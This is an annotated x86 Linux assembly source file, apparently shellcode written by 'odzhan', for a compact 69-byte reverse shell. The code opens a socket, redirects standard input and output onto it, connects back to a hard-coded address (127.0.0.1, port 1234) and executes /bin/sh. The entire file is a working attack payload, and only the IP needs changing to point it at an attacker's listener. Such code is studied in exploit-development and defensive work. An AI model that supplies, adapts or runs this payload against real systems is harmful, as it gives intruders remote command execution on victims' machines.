

; 69 byte reverse shell for linux/x86
; odzhan

    bits 32
    
start:
    ; step 1, create a socket
    xor    ebx, ebx          ; ebx=0
    mul    ebx               ; eax=0, edx=0 (nicely done :)
    mov    al, 0x66          ; eax      = sys_socketcall
    inc    ebx               ; ebx      = sys_socket
    push   edx               ; protocol = IPPROTO_IP
    push   ebx               ; type     = SOCK_STREAM
    push   2                 ; family   = AF_INET
    mov    ecx, esp          ; ecx      = &args
    int    0x80
    
    xchg   eax, ebx          ; ebx      = sockfd
    
    ; step 2, assign socket to stdin, stdout, stderr
    pop    ecx               ; ecx=2
    push   0x100007f         ; sa.sin_addr = inet_addr("127.0.0.1")
    push   word 0xD204       ; sa.port     = htons(1234)
    push   word cx           ; sa.family   = AF_INET
dup_loop:
    mov    al, 0x3f          ; eax=sys_dup2
    int    0x80 
    dec    ecx
    jns    dup_loop          ; jump if not signed
    
    mov    ecx, esp          ; ecx=&sa
    mov    al, 0x66          ; eax=sys_socketcall
    
    ; step 3, connect to remote host
    push   0x10              ; sizeof(sa)
    push   ecx               ; &sa
    push   ebx               ; sockfd
    mov    ecx, esp          ; &args
    push   3
    pop    ebx               ; ebx=sys_connect
    int    0x80
    
    ; step 4, execute /bin/sh
    mov    al, 0xb           ; eax=sys_execve
    push   edx               ; '\0'
    push   0x68732f2f	       ; "hs//"
    push   0x6e69622f	       ; "nib/"
    mov    ebx, esp          ; ebx="/bin//sh", 0
    xor    ecx, ecx          ; ecx=0 argv=0
    int    0x80              ; exec sys_execve
    
    
  
